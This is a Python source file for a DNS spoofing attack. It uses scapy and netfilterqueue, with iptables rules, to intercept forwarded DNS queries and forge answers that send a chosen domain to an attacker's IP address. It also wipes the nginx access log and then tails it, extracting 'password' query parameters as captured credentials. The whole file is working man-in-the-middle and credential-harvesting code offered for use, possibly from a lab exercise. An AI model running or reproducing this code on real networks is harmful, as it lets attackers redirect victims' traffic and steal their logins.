"""
DNS spoofing attack module
"""

import scapy.all as scapy
import netfilterqueue
import subprocess
import threading
import re

from common import (
    cleanup_iptables,
    log_packet,
    SPOOF_DOMAIN, 
    SPOOF_TO_IP,
    NGINX_ACCESS_LOG
)

# Nginx log monitoring for credentials
def monitor_nginx_logs():
    """Tail nginx access log and extract credentials"""
    # Clear nginx logs first
    subprocess.run(["truncate", "-s", "0", NGINX_ACCESS_LOG], capture_output=True)

    print(f"+ Cleared nginx access log")
    
    # Tail file in background to logging to look for credentials
    process = subprocess.Popen(
        ["tail", "-F", NGINX_ACCESS_LOG],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Keywords to search for in logs
    keywords = ['password']
    
    try:
        for line in process.stdout:
            line = line.strip()
            line_lower = line.lower()
            
            # Check if line contains credential keywords
            if any(kw in line_lower for kw in keywords):
                # Extract the request path with query params
                match = re.search(r'"GET\s+[^\s"?]+\?([^"\s]+)', line)
                if match:
                    request_path = match.group(1)
                    print(f"[CREDENTIALS CAPTURED] {request_path}")
                    log_packet(f"[CREDENTIALS CAPTURED] From nginx log", credential=request_path)
                else:
                    print(f"[CREDENTIALS CAPTURED] {line[:100]}")
                    log_packet(f"[CREDENTIALS CAPTURED] From nginx log", credential=line[:500])
                    
    except Exception as e:
        print(f"[ERROR] Nginx log monitoring: {e}")
    finally:
        process.terminate()


# IPTables Setup
def setup_dns_iptables():
    """Setup iptables to forward DNS queries to netfilter queue"""
    # Flush existing IPtables rules
    cleanup_iptables()
    
    # Allow forwarding for all other traffic 
    subprocess.run(["iptables", "-A", "FORWARD", "-j", "ACCEPT"], capture_output=True)
    
    # Forward DNS queries (UDP port 53) to queue 0
    subprocess.run(["iptables", "-I", "FORWARD", "-p", "udp", "--dport", "53", 
                   "-j", "NFQUEUE", "--queue-num", "0"], capture_output=True)
    
    print("+ IPtables rules configured for DNS spoofing")


# DNS Packet Processing
def process_dns_packet(packet):
    """Process DNS packets and spoof responses for spoof domain"""
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        
        # Check if packet is DNS query (port 53)
        if scapy_packet.haslayer(scapy.UDP) and scapy_packet[scapy.UDP].dport == 53:
            if scapy_packet.haslayer(scapy.DNSQR):
                dns_query = scapy_packet[scapy.DNSQR]
                query_name = dns_query.qname.decode('utf-8', errors='ignore')
                print(f"[DNS] Query detected: {query_name}")
                
                # Check if the query is for the target domain
                if SPOOF_DOMAIN in query_name:
                    print(f"[DNS] Spoofing response: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
                    log_packet(f"[DNS] Spoofing response: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
                    # Create spoofed DNS response
                    spoofed_response = create_spoofed_dns_response(scapy_packet)
                    if spoofed_response:
                        packet.set_payload(bytes(spoofed_response))
                        
    except Exception as e:
        print(f"[ERROR] DNS packet processing: {e}")
    
    packet.accept()


def create_spoofed_dns_response(original_packet):
    """Create a spoofed DNS response packet"""
    try:
        # Load layers from packet
        ip_layer = original_packet[scapy.IP]
        udp_layer = original_packet[scapy.UDP]
        dns_layer = original_packet[scapy.DNS]
        
        # Swap source and destination IP
        spoofed_ip = scapy.IP(
            src=ip_layer.dst,
            dst=ip_layer.src
        )
        
        # Swap source and destination port
        spoofed_udp = scapy.UDP(
            sport=udp_layer.dport,
            dport=udp_layer.sport
        )
        
        # Create DNS response
        spoofed_dns = scapy.DNS(
            id=dns_layer.id,
            qr=1,            # Response
            aa=0,            # Not authoritative
            ra=1,            # Recursion available
            qd=dns_layer.qd, # DNS question
            an=scapy.DNSRR(
                rrname=dns_layer.qd.qname, # Domain name
                type="A",
                rclass="IN",
                ttl=300,
                rdata=SPOOF_TO_IP
            )
        )
        
        return spoofed_ip / spoofed_udp / spoofed_dns
        
    except Exception as e:
        print(f"[ERROR] Creating spoofed DNS response: {e}")
        return None


# DNS spoofing attack initialization functions
def start_dns_spoofing():
    """Start the DNS spoofing attack"""
    # Create and run network queue
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_dns_packet)
    queue.run()

    print(f"+ DNS spoofing attack ready: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")


def run_dns_spoofing():
    """Start DNS spoofing thread"""
    # Setup IP tables
    setup_dns_iptables()

    # Start DNS spoofing thread
    dns_thread = threading.Thread(target=start_dns_spoofing, daemon=True)
    dns_thread.start()
    
    # Start nginx log monitoring thread
    nginx_thread = threading.Thread(target=monitor_nginx_logs, daemon=True)
    nginx_thread.start()
    
    return dns_thread
